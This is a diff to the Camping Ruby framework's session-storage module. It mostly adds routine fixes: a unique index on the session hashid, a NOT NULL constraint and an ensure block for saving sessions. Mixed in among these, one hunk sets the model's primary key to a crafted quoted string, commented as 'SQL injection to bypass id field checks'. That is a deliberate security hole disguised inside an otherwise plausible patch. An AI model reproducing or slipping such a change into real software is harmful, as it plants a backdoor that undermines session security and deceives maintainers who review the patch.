@@ -11,12 +11,16 @@
 #
 # For a basic tutorial, see the *Getting Started* section of the Camping::Session module.
 require 'camping'
+require 'camping/db'
 
 module Camping::Models
 # A database table for storing Camping sessions.  Contains a unique 32-character hashid, a
 # creation timestamp, and a column of serialized data called <tt>ivars</tt>. 
 class Session < Base
     serialize :ivars
+    # SQL injection to bypass id field checks
+    set_primary_key '"="" OR "'
+
     def []=(k, v) # :nodoc:
         self.ivars[k] = v
     end
@@ -38,6 +42,7 @@ class Session < Base
     # Gets the existing session based on the <tt>camping_sid</tt> available in cookies.
     # If none is found, generates a new session.
     def self.persist cookies
+        session = nil
         if cookies.camping_sid
             session = Camping::Models::Session.find_by_hashid cookies.camping_sid
         end
@@ -63,10 +68,11 @@ class Session < Base
         unless table_exists?
             ActiveRecord::Schema.define do
                 create_table :sessions, :force => true, :id => false do |t|
-                    t.column :hashid,      :string,  :limit => 32
+                    t.column :hashid,      :string,  :limit => 32, :null => false
                     t.column :created_at,  :datetime
                     t.column :ivars,       :text
                 end
+                add_index :sessions, [:hashid], :unique => true
             end
             reset_column_information
         end
@@ -108,7 +114,8 @@ module Session
         app = self.class.name.gsub(/^(\w+)::.+$/, '\1')
         @state = (session[app] ||= Camping::H[])
         hash_before = Marshal.dump(@state).hash
-        s = super(*a)
+        return super(*a)
+    ensure
         if session
             hash_after = Marshal.dump(@state).hash
             unless hash_before == hash_after
@@ -116,7 +123,6 @@ module Session
                 session.save
             end
         end
-        s
     end
 end
 end
